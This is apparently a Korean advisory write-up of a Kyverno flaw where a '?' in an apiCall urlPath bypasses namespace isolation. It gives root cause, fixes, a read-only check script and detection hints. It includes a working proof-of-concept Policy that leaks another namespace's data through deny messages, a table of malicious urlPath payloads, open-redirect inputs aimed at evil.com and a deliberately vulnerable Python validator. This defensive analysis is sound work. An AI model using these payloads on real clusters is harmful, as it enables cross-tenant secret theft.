# GHSA-pcx2-xcq4-65vf — Kyverno `apiCall` URL 파서 불일치로 네임스페이스 격리 우회

[한국어](README.md) | [English](README_en.md)

물음표 `?` 한 글자로 Kyverno의 네임스페이스 격리가 뚫렸습니다. 네임스페이스에 묶인 테넌트가 `apiCall`의 `urlPath`에 `/api/v1/nodes?x=/namespaces/default/` 같은 값을 넣으면, **검증기는 쿼리 안의 `/namespaces/default/`를 보고 통과**시키지만 **실행기(client-go)는 `?` 뒤를 잘라 클러스터 전역 `/api/v1/nodes`로 요청**합니다. 결과적으로 테넌트는 다른 네임스페이스의 Secret과 클러스터 자원을 Kyverno의 권한으로 읽습니다.

핵심은 심각도 숫자가 아니라 **같은 문자열을 두 개의 서로 다른 파서가 읽는다**는 점입니다. Go `path.Clean`은 파일 경로용이라 `?`를 특별한 문자로 보지 않고, `net/url`은 `?`를 쿼리 시작으로 자릅니다. 이 불일치가 검증/실행 사이의 틈이 됩니다. 수정 버전은 **Kyverno 1.19.2**이고, 노출 여부는 [`check_kyverno_parser.sh`](check_kyverno_parser.sh)로 읽기 전용 점검이 가능합니다.

## 한눈에

| 항목 | 내용 |
| --- | --- |
| GitHub Advisory | GHSA-pcx2-xcq4-65vf (Critical), 2026-10-21 공개 |
| CVE | CVE-2026-122312 |
| 분류 | CWE-269 Improper Privilege Management · CWE-918 Server-Side Request Forgery |
| CVSS | Akamai 발표 기준 **10.0** · CVE 레코드 기준 v4 **8.3** (`AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N`) |
| 영향 | Kyverno **1.19.2 미만** (GitHub Advisory 표기). CVE·Bitnami 레코드는 **1.19.1 이상 1.19.2 미만**으로 범위를 좁혀 표기 |
| 수정 | **Kyverno 1.19.2** — PR #17984, commit `f67231def576eb0ad153dd8cbfc836908ab14c14` |
| 신고 | Akamai Security Group, 2026-09-03 신고 → 2026-10-21 Advisory 공개 → 2026-11-24 분석 블로그 |
| 노출 규모 | Akamai 텔레메트리 기준 엔터프라이즈 네트워크 **4%** |
| 전제 | 테넌트에 **네임스페이스 `Policy`(apiCall) 생성 권한** + Kyverno admission SA의 기본 광범위 RBAC |
| 점검 | [check_kyverno_parser.sh](check_kyverno_parser.sh) · 검증 코드 비교 [url_validator_example.py](url_validator_example.py) |

> **CVSS가 두 개인 이유**: Akamai는 GHSA에 CVSS 10.0으로 신고·발표했고, 이후 등록된 CVE-2026-122312 레코드(Bitnami/OSV, VulnCheck)는 CVSS v4 8.3을 표기합니다. GitHub Advisory 자체 심각도는 Critical입니다. 사내 보고서·카드뉴스에 수치를 인용할 때는 **어느 출처의 점수인지 함께 적는 편이 안전**합니다.

## 1. 무슨 문제인가

Kyverno는 클러스터 전역 admission controller입니다. 모든 네임스페이스의 요청을 검사해야 하므로 admission controller ServiceAccount는 클러스터 전역 읽기 권한을 기본으로 가집니다. 이 구조 자체는 정상이고, 그래서 **정책을 작성할 수 있는 사람은 Kyverno의 권한을 빌려 쓰는 셈**이 됩니다.

`apiCall`은 정책이 판단에 필요한 외부 데이터를 Kubernetes API에서 조회하는 정식 기능입니다. 예를 들어 "허용 이미지 목록 ConfigMap을 읽어 Pod 이미지를 검사"하는 정책이 대표적입니다.

문제는 Kyverno가 **네임스페이스에 묶인(namespaced) `Policy`**에서 이 `apiCall`이 자기 네임스페이스 밖을 조회하지 못하도록 제한한다는 점입니다. 이 제한은 CVE-2026-22039(2026-01) 이후 들어간 것이고, GHSA-pcx2-xcq4-65vf는 **그 제한을 우회하는 방법**입니다.

- 공격자는 낮은 권한(자기 네임스페이스의 Policy 생성)만 가집니다.
- Kyverno는 높은 권한(클러스터 전역 읽기)을 가집니다.
- 공격자가 Kyverno를 시켜 자기 권한 밖의 데이터를 읽게 합니다 → 전형적인 **confused deputy**.

## 2. Root Cause — 검증기는 파일 경로로, 실행기는 URL로 읽는다

`pkg/engine/apicall/apiCall.go`의 `Fetch()`(당시 68–106행)는 `URLPath`를 `url.PathUnescape` → `path.Clean`으로 정리한 뒤, 아래 정규식으로 네임스페이스를 뽑아 정책 네임스페이스와 비교합니다.

```go
var namespacePathRegex = regexp.MustCompile(`^/api(s)?/.*?/namespaces/([^/]+)/?.*$`)
```

여기서 `path.Clean`은 **파일 경로용** 함수입니다. 파일 이름에 `?`는 특별한 의미가 없으므로 `?`를 그대로 둡니다. 반면 실제 요청을 보내는 client-go는 `net/url`로 URL을 파싱하며 `?` 뒤를 쿼리로 분리합니다.

### 검증기가 보는 것

입력: `/api/v1/nodes?x=/namespaces/default/`

1. `url.PathUnescape` — 퍼센트 인코딩이 없으므로 변화 없음
2. `path.Clean` — `/api/v1/nodes?x=/namespaces/default` (`?`를 경로 문자로 취급, 끝 슬래시만 제거)
3. `namespacePathRegex` — lazy `.*?`가 `v1/nodes?x=`를 삼키고, `/namespaces/` 뒤 `([^/]+)`가 **`default`**를 캡처
4. 정책 네임스페이스가 `default`이므로 **검증 통과**

### 실행기가 보내는 것

1. 실행 경로는 정리되지 않은 **원본** `call.APICall.URLPath`를 그대로 넘깁니다: `executor.Execute()` → `executeK8sAPICall()` → `client.RawAbsPath()` → `c.rest.Get().RequestURI(path)`
2. `RequestURI`가 `net/url.Parse`로 분리 → Path `/api/v1/nodes`, Query `x=/namespaces/default/`
3. 실제 요청: **`GET /api/v1/nodes`** — 클러스터 전역 자원

Kubernetes API 서버는 **경로로만 라우팅**하고 모르는 쿼리 파라미터는 무시합니다. 그래서 검증기가 본 네임스페이스와 실제로 도달한 자원이 완전히 달라집니다.

### 더 근본적인 문제: 검증값과 실행값이 다르다 (TOCTOU형)

쿼리 문자열 문제를 고쳐도, **검증은 `cleanPath`에, 실행은 원본 `URLPath`에** 하는 구조 자체가 남습니다. 같은 입력의 서로 다른 표현을 다루는 한 다음 우회가 또 나옵니다. 수정 커밋은 `canonicalizeURLPath()`를 도입해 `net/url`로 path·query·fragment를 **먼저 분리한 뒤** 경로만 디코딩·정리하고, **검증과 실행이 같은 하나의 정규화 값**을 쓰도록 바꿨습니다. (정상 동작을 위해 실행 시에는 path+query를 함께 보내되, 네임스페이스 검사는 정리된 경로에만 겁니다.)

퍼센트 인코딩 경로 순회를 막던 이전 하드닝 커밋 `7ac176ac8`(GHSA-c5qq-7g2q-cpqp 등)은 **쿼리 문자열 주입은 다루지 않았습니다.** 이번 건이 그 빈틈입니다.

## 3. 공격 흐름 — 반출은 차단 메시지로 한다

데이터를 읽어도 정책이 조용히 통과하면 공격자는 결과를 볼 수 없습니다. 그래서 **일부러 실패하는 정책**을 만들고, **deny 메시지에 조회 결과를 보간**해 반출합니다.

1. 테넌트가 자기 네임스페이스에 `Policy`를 만들고 `context.apiCall.urlPath`에 decoy를 넣습니다.
2. `validate.message`에 `{{ leakedData }}`를 넣고 `deny: {}`로 항상 차단하게 합니다.
3. 공격자가 매칭되는 리소스(예: ConfigMap)를 만들면, admission webhook이 deny 응답을 돌려주고 **그 메시지에 조회한 ConfigMap 내용이 실려** 공격자에게 반환됩니다.

```yaml
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: cross-ns-leak
  namespace: default            # 테넌트 네임스페이스
spec:
  validationFailureAction: Enforce
  rules:
  - name: leak-config
    match:
      resources:
        kinds: [ConfigMap]
    context:
    - name: leakedData
      apiCall:
        urlPath: "/api/v1/configmaps?x=/namespaces/default/"
        method: GET
        jmesPath: "items[?metadata.namespace == 'kube-system' && metadata.name == 'target-cm'].data | [0]"
    validate:
      message: "LEAKED DATA: {{ leakedData }}"
      deny: {}
```

트리거 후 실제 응답(Advisory PoC):

```
Error from server: error when creating "STDIN": admission webhook "validate.kyverno.svc-fail" denied the request:
cross-ns-leak:
  leak-config: 'LEAKED DATA: {"key":"confidential-data"}'
```

차단은 되었지만 데이터는 이미 새어 나왔습니다. **차단 응답도 반출 채널**이라는 점이 이 사건의 실무 교훈입니다.

## 4. 변종 페이로드

같은 원리는 클러스터 전역·교차 네임스페이스 자원 어디에나 적용됩니다. 아래 표의 앞 4행은 Advisory 원문, 마지막 행은 수정 커밋이 fragment를 거부한다는 점에서 확인되는 같은 계열 변종입니다.

| 악성 `urlPath` | 검증기가 인식한 네임스페이스 | 실제 요청 경로 |
| --- | --- | --- |
| `/api/v1/nodes?x=/namespaces/default/` | `default` | `/api/v1/nodes` (클러스터 전역) |
| `/api/v1/secrets?x=/namespaces/default/` | `default` | `/api/v1/secrets` (모든 네임스페이스) |
| `/apis/rbac.authorization.k8s.io/v1/clusterroles?x=/namespaces/default/` | `default` | `/apis/.../clusterroles` |
| `/api/v1/namespaces/kube-system/secrets?x=/namespaces/default/` | `default` ※ | `/api/v1/namespaces/kube-system/secrets` |
| `/api/v1/secrets#/namespaces/default/` | `default` | `/api/v1/secrets` (`#` 이하 fragment 미전송) |

> **※ 재현 주의 — 4행은 표기 그대로는 검증에서 막힙니다.** 정규식의 `.*?`가 lazy라 경로에서 **가장 먼저 나오는** `/namespaces/`를 캡처합니다. 그래서 `/api/v1/namespaces/kube-system/secrets?...`는 `kube-system`이 잡혀 거부됩니다. 실제 교차 네임스페이스 읽기는 경로에 네임스페이스가 없는 **클러스터 전역 컬렉션**(`/api/v1/secrets`, `/api/v1/configmaps`)으로 이뤄집니다. [`url_validator_example.py`](url_validator_example.py)의 4번 케이스가 이 동작을 그대로 보여줍니다. Advisory 예시를 그대로 옮겨 적을 때 가장 많이 틀리는 지점입니다.

**읽기만이 아닙니다.** 수정 커밋 메시지에 따르면 같은 query decoy로 `POST`를 보내면 클러스터 전역 `MutatingWebhookConfiguration` 생성까지 가능했고, 그 결과는 CVE-2026-100706으로 따로 다뤄집니다. 조회 API만 막아서는 끝나지 않는 이유입니다.

## 5. 웹앱에서 똑같이 터지는 함정 3가지

Kyverno는 Go였지만, 같은 실수는 일반 웹 백엔드에 그대로 있습니다. 사내 코드 점검 시 같이 보세요.

### ① `posixpath.normpath` + `requests`

`normpath`는 파일 경로 함수라 `?`·`#`을 일반 문자로 봅니다. `requests`/urllib3는 같은 문자열을 URL로 파싱해 쿼리를 분리 전송합니다. 검증은 A를 보고, 요청은 B로 갑니다.

```python
import posixpath, requests
path = f"/internal/{user_input}"
safe = posixpath.normpath(path).startswith("/internal/")   # '?'는 신경 쓰지 않음
requests.get("http://api.internal" + path)                  # '?' 뒤는 쿼리로 전송
```

### ② `?next=` 오픈 리다이렉트 — 브라우저와 `urlsplit`의 해석 차이

브라우저(WHATWG URL)는 특수 스킴에서 **역슬래시 `\`를 `/`로 정규화**합니다. Python `urlsplit`은 RFC 3986대로 읽습니다. 그래서 검증기는 안전하다고 보고, 브라우저는 다른 호스트로 갑니다.

| 입력 | `urlsplit().hostname` | 브라우저가 실제로 가는 곳 |
| --- | --- | --- |
| `https://evil.com\@good.com/` | `good.com` (허용됨) | `evil.com` |
| `/\evil.com` | 없음(`path`), `/`로 시작해 통과 | `//evil.com` → `evil.com` |

검증 규칙: ① 역슬래시가 있으면 거부 ② `urlsplit` 결과에 scheme·netloc이 있으면 거부 ③ 경로가 `/` 하나로 시작하고 `//`가 아니어야 함 ④ 퍼센트 디코딩 후 다시 검사.

### ③ 에러 메시지에 조회 데이터를 보간

차단 응답이라도 조회값을 그대로 출력하면 반출 채널이 됩니다. deny 사유에는 **고정 코드·문서 링크**만 넣고, 조회 결과 원문은 절대 넣지 않습니다.

## 6. 발동 조건

| 조건 | 설명 |
| --- | --- |
| Kyverno **1.19.2 미만** | 1.19.2에서 수정. CVE 레코드는 1.19.1~1.19.2로 좁혀 표기하므로, 1.19.2 미만은 모두 업그레이드 대상으로 보는 편이 안전 |
| 테넌트에 **네임스페이스 `Policy` 생성 권한** | 멀티테넌트 Kyverno 운영에서 흔한 권한. 여기에 `apiCall` 포함 정책 작성이 가능해야 함 |
| Kyverno admission SA의 **광범위 RBAC** | 기본 설치값. 정책이 요청하는 경로를 실행할 수 있어야 함 |
| 공격자가 **정책을 트리거하고 deny 메시지를 볼 수 있음** | 매칭 리소스 생성 권한만 있으면 됨 |

### 해당 없음 / 위험 낮음

- **1.19.2 이상** — 수정됨.
- **`apiCall`을 쓰지 않는 클러스터** — 이 취약점의 경로 자체가 없음. 다만 업그레이드는 필요(1.19.2가 이 건 포함 24개 Advisory를 고칩니다).
- **정책을 플랫폼 팀만 만드는 환경** — 테넌트 격리 우회는 아님. 그러나 정책 작성자는 여전히 Kyverno 권한으로 읽을 수 있으므로 신뢰 경계는 유지해야 함.
- **모든 사용자가 클러스터 관리자인 환경** — 넘을 경계가 없어 실질 영향 없음.

## 7. 즉시 조치 3단계

1. **Kyverno v1.19.2 이상으로 업그레이드.** Helm·kustomize 등 설치 방식대로 올리고, 배포 이미지 태그가 실제로 바뀌었는지 확인합니다. 1.19.2는 24개 Advisory(9 Critical·14 High·1 Moderate)를 함께 고칩니다.
2. **네임스페이스 `Policy` 생성 권한(RBAC) 최소화.** 멀티테넌트 클러스터에서 테넌트에게 `policies.kyverno.io` 생성 권한이 열려 있는지 확인하고 회수·제한합니다. 테넌트별 요구는 **플랫폼 팀이 작성한 정책 + 파라미터**로 흡수하는 편이 안전합니다.
3. **사내 URL 검증 코드 3원칙.** ① `net/url`·`urlsplit` 등 **URL 파서로 먼저 파싱** ② 정규식 대신 **경로 세그먼트 위치로 비교** ③ **검증한 그 문자열만 실행**. 파일 경로 함수(`path.Clean`, `normpath`)로 URL을 검증하지 않습니다.

```bash
# 급할 때 쓰는 grep (상세 점검은 check_kyverno_parser.sh)
grep -rnE 'path\.Clean|posixpath\.normpath|startswith\("/"\)' --include='*.go' --include='*.py' .
```

## 8. 노출 점검

`check_kyverno_parser.sh`는 **읽기 전용**입니다. 클러스터에는 `get`/`list`만, 소스에는 `grep`만 사용합니다.

```bash
curl -sSLO https://raw.githubusercontent.com/ddukbg/devsecops.kr/main/kyverno-url-parser-ghsa-pcx2-xcq4-65vf/check_kyverno_parser.sh
bash check_kyverno_parser.sh                 # 클러스터 + 현재 디렉터리 소스
bash check_kyverno_parser.sh --dir ./src     # 소스 경로 지정
bash check_kyverno_parser.sh --context prod --csv > kyverno_audit.csv
bash check_kyverno_parser.sh --strict        # 위험 항목이 있으면 종료코드 1
```

| # | 점검 | 방법 |
| --- | --- | --- |
| 1 | 클러스터 내 Kyverno 버전(이미지 태그) — 1.19.2 미만 여부 | `kubectl get deployments -A -o jsonpath` |
| 2 | 네임스페이스 `Policy` 목록과 **`apiCall` 사용 여부** | `kubectl get policies.kyverno.io -A` + 정책별 `-o yaml` grep |
| 3 | `urlPath`에 `?`·`#`·`%3F` decoy가 들어간 정책 | 정책 YAML grep |
| 4 | 소스의 `path.Clean`·`normpath`·`startswith("/")` 패턴 | `grep -rn` |

출력 예시(값은 예시):

```
== 1. Kyverno 버전 ==
NAMESPACE    WORKLOAD                       IMAGE (VERSION)                                        VERDICT
kyverno      kyverno-admission-controller   ghcr.io/kyverno/kyverno:v1.19.1 (1.19.1)               ACT_NOW
kyverno      kyverno-cleanup-controller     ghcr.io/kyverno/cleanup-controller:v1.19.1 (1.19.1)    ACT_NOW

== 2. 네임스페이스 Policy 의 apiCall ==
USES_APICALL tenant-a/read-allowed-images   urlPath: "/api/v1/namespaces/tenant-a/configmaps/allowed"
DECOY       tenant-b/leak                  urlPath: "/api/v1/configmaps?x=/namespaces/tenant-b/"

== 요약 ==
위험 3건(버전 2 · 정책 decoy 1) · 소스 의심 패턴 0 · 건너뜀 0건 (기준: Kyverno 1.19.2 미만)
```

판정 코드: `ACT_NOW`(1.19.2 미만) · `OK` · `VERIFY`(태그 해석 불가, `latest`·digest) · `DECOY`(쿼리·fragment에 네임스페이스 문자열) · `USES_APICALL`(apiCall 사용, decoy 없음) · `SKIP`(CRD·권한·접속 없음).
옵션: `--context`·`--kubeconfig`·`--dir`·`--csv`·`--strict`·`--skip-cluster`·`--skip-source`·`--kubectl PATH`(테스트용 대체 실행 파일).

검증 코드는 [`url_validator_example.py`](url_validator_example.py)에 취약한 검증과 `urlsplit` 기반 안전한 검증을 나란히 두고 6개 케이스로 실행합니다.

```bash
python3 url_validator_example.py
```

## 9. 탐지 힌트

- Kyverno SA가 보내는 API 요청의 **URI에 `/namespaces/` 문자열이 쿼리로 붙는 경우**는 정상 정책에서 흔치 않습니다. API 서버 감사 로그(audit)에서 Kyverno SA(`system:serviceaccount:kyverno:kyverno-admission-controller` 등)의 요청 URI를 확인하세요. (실행 요청이 path+query를 함께 보낸다는 수정 커밋 설명에 근거한 추론입니다.)
- 테넌트 네임스페이스에서 **`apiCall`을 포함한 `Policy` 생성** 자체를 이벤트로 수집합니다. 정상 운영에서 드문 이벤트입니다.
- admission deny 응답 본문에 ConfigMap/Secret 값처럼 보이는 문자열이 섞여 나가는지 로그에서 확인합니다.

## 10. 2분 요약

- Kyverno **1.19.2 미만**에서, 네임스페이스 `Policy`의 `apiCall.urlPath`에 `?x=/namespaces/<자기ns>/`를 넣으면 **네임스페이스 격리가 우회**됩니다.
- 원인은 **`path.Clean`(파일 경로)과 `net/url`(URL)의 파싱 불일치** + 검증값과 실행값이 다른 TOCTOU형 구조입니다.
- 반출은 **deny 메시지 보간**으로 이뤄집니다. 차단 응답이 곧 유출 채널입니다.
- **조치**: ① 1.19.2 업그레이드 ② 테넌트 `Policy` 생성 RBAC 최소화 ③ 사내 URL 검증을 "파싱 → 경로 세그먼트 비교 → 검증값 그대로 실행"으로 교체.
- 일반 웹앱도 같습니다. **URL은 URL 파서로 먼저 파싱**하고, 파일 경로 함수로 검증하지 마세요.

## 출처

- GitHub Advisory — GHSA-pcx2-xcq4-65vf (kyverno/kyverno, Critical): https://github.com/kyverno/kyverno/security/advisories/GHSA-pcx2-xcq4-65vf
- Akamai Security Research — How a URL Parser Differential Broke Kyverno's Namespace Isolation (2026-11-24, CVSS 10.0, 텔레메트리 4%): https://www.akamai.com/blog/security-research/url-parser-differential-broke-kyvernos-namespace-isolation
- 수정 커밋 — `f67231d` `[1.19] fix(security): API path validation, apiCall canonicalization...` (#17984): https://github.com/kyverno/kyverno/commit/f67231def576eb0ad153dd8cbfc836908ab14c14
- 릴리스 — Kyverno v1.19.2 (24개 Advisory 수정): https://github.com/kyverno/kyverno/releases/tag/v1.19.2
- CVE 레코드 — CVE-2026-122312 (CVSS v4 8.3, 1.19.1~1.19.2): https://www.cve.org/cverecord?id=CVE-2026-122312 · https://osv.dev/vulnerability/BIT-kyverno-2026-122312
- 선행 취약점 — CVE-2026-22039 / GHSA-8p9x-46gm-qfx2 (네임스페이스 격리 최초 도입): https://github.com/advisories/GHSA-8p9x-46gm-qfx2

확인 기준일: 2026-11-27. Advisory·CVE 레코드의 영향 범위와 점수는 갱신될 수 있으므로 Kyverno 공지와 함께 확인하세요.
